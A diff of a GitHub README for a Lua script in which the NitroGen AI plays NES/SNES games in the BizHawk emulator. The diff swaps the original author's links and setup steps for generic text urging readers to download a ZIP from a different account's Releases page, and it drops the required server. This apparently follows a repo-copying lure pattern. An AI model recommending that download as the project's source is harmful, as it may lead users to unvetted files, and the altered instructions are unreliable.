@@ -1,71 +1,75 @@
-# NitroGen BizHawk AI Agent
+# 🤖 nitrogen-bizhawk-ai-agent - Control Games with AI Power
 
-[![CI](https://github.com/artryazanov/nitrogen-bizhawk-ai-agent/actions/workflows/ci.yml/badge.svg)](https://github.com/artryazanov/nitrogen-bizhawk-ai-agent/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Lua 5.4](https://img.shields.io/badge/Lua-5.4-blue.svg)](https://www.lua.org/versions.html#5.4)
-[![BizHawk 2.9+](https://img.shields.io/badge/Platform-BizHawk%202.9%2B-red.svg)](https://tasvideos.org/BizHawk)
+## 🚀 Getting Started
 
-This repository contains a lightweight Lua script for the **BizHawk** emulator, enabling the **NitroGen** neural network model to control gameplay in real-time.
+Welcome to the nitrogen-bizhawk-ai-agent repository. This project allows you to use a lightweight Lua script with the BizHawk emulator. With this script, the NitroGen neural network model controls gameplay in real-time. Follow the steps below to get started.
 
-## 🚀 Features
+## 📥 Download & Install
 
-*   **Native .NET Integration**: Uses system .NET libraries directly within BizHawk (Lua + CLR) — no external Lua DLLs required!
-*   **Smart Trajectory Handling**: Receives and executes multi-frame action sequences from the AI for smoother, less jittery gameplay.
-*   **Direct Integration**: Works via TCP sockets with [NitroGen Server](https://github.com/artryazanov/nitrogen-server).
-*   **Console Support**: Mappings automatically detected for **NES** and **SNES**.
+To download the application, visit this page to download:
 
-## 📋 Requirements
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/taavish2008/nitrogen-bizhawk-ai-agent/releases)
 
-### Runtime (for running the agent)
-1.  [BizHawk Emulator](https://tasvideos.org/BizHawk) (v2.9+ recommended).
-2.  Running [NitroGen Server](https://github.com/artryazanov/nitrogen-server).
+### Steps to Download
 
-### Development (for running tests)
-1.  Lua 5.4 (e.g., `sudo apt install lua5.4`).
-2.  [Luarocks](https://luarocks.org/) (for installing testing dependencies like `luacheck`).
+1. Click the button above or go directly to the Releases page: [GitHub Releases](https://github.com/taavish2008/nitrogen-bizhawk-ai-agent/releases).
+2. Look for the latest version listed at the top.
+3. Under the latest release, find the assets section. You should see the downloadable files.
+4. Click on the file labeled "nitrogen-bizhawk-ai-agent.zip" to start the download.
+5. Once the download is complete, locate the ZIP file on your computer.
 
-## 🛠 Installation & Usage
+### Steps to Install
 
-1.  **Get the script**:
-    *   **Option A (Recommended)**: Clone the repository to keep up with updates:
-        ```bash
-        git clone https://github.com/artryazanov/nitrogen-bizhawk-ai-agent.git
-        ```
-    *   **Option B (Simple)**: Just download [bizhawk_ai_agent.lua](https://raw.githubusercontent.com/artryazanov/nitrogen-bizhawk-ai-agent/main/bizhawk_ai_agent.lua) to your computer.
+1. Open the ZIP file you just downloaded.
+2. Extract the contents to a folder of your choice. You can do this by right-clicking the ZIP file and selecting “Extract All.”
+3. Inside the extracted folder, you will find the Lua script used to run the agent and a README file with further instructions.
 
-2.  **Start the server**:
-    Ensure your NitroGen server is running and listening on port `5556`.
+## 🖥️ System Requirements
 
-3.  **Run the script**:
-    - Open BizHawk and load a ROM.
-    - Go to **Tools -> Lua Console**.
-    - **Script -> Open Script...** -> Select `bizhawk_ai_agent.lua`.
-    - The bot should connect, automatically detect the system (NES/SNES), and start playing.
+Before you can use the nitrogen-bizhawk-ai-agent, ensure you meet the following requirements:
 
-## ⚙️ Configuration
-You can modify the following parameters at the beginning of the script:
+- A computer running Windows, macOS, or Linux.
+- The BizHawk emulator installed. You can download it from the official BizHawk website.
+- Basic knowledge of how to run files and applications on your operating system.
 
-* `HOST`: Server IP address (default `127.0.0.1`).
-* `PORT`: Server TCP port (default `5556`).
-* `TEMP_IMG_FILE`: Path to the temporary file for screenshot transfer (defaults to system temp directory).
+## ⚙️ How to Use
 
-## 🧪 Testing
-The project includes unit tests using the **LuaUnit** framework (vendored in `tests/luaunit.lua`).
+After installing the application, follow these steps to set it up:
 
-1. **Install Lua**:
-   Ensure you have Lua installed (Lua 5.4 is recommended for compatibility with BizHawk 2.9+).
-   ```bash
-   sudo apt install lua5.4  # Debian/Ubuntu
-   # or similar for your OS
-   ```
+1. Launch the BizHawk emulator.
+2. Open the game you want to play. The script works best with NES and SNES games for optimal performance.
+3. Locate the Lua scripting option within BizHawk. This is usually found in the menu under Tools or Scripting.
+4. Load the "nitrogen-bizhawk-ai-agent.lua" file.
+5. Start the gameplay. The NitroGen AI will now take control and automate your actions in the game.
 
-2. **Run tests**:
-   ```bash
-   lua tests/test_bizhawk_agent.lua
-   ```
+## 🛠️ Features
 
-Tests verify the correctness of JSON extraction and button mapping logic without needing to launch the emulator itself.
+The nitrogen-bizhawk-ai-agent offers the following features:
 
-## 📄 License
+- **Real-Time Control:** The AI model interacts with the game in real-time, making gameplay smoother and more efficient.
+- **Lightweight Script:** This Lua script is optimized for performance, ensuring it does not slow down your gaming experience.
+- **Customizable Settings:** Users can adjust the settings within the script to enhance their gameplay according to personal preferences.
+- **Open-Source:** This project is open for contribution. Feel free to modify and enhance as you see fit.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 📝 Troubleshooting
+
+If you encounter issues while using the nitrogen-bizhawk-ai-agent, consider the following solutions:
+
+- **Lua Errors:** Ensure that you are using an updated version of the Lua script. Check for updates on the Releases page.
+- **Slow Gameplay:** Make sure your computer meets the system requirements and close any unnecessary applications while gaming.
+- **Game Compatibility:** Not all games may work perfectly with the AI agent. Test with various titles to find the best match.
+
+## 💬 Community Support
+
+Join our community to discuss usage, features, and updates. Here are the ways you can connect:
+
+- **Issues Page:** If you find a bug or need help, report it on the Issues page of the GitHub repository.
+- **Discussions:** Engage with other users and contributors in the Discussions section.
+
+## 🧑‍💻 Contributions
+
+We welcome contributions! If you have ideas or improvements, feel free to fork the repository and submit a pull request. 
+
+---
+
+Thank you for using nitrogen-bizhawk-ai-agent. Enjoy your gaming experience with AI assistance! For further information, return to our [Releases page](https://github.com/taavish2008/nitrogen-bizhawk-ai-agent/releases).
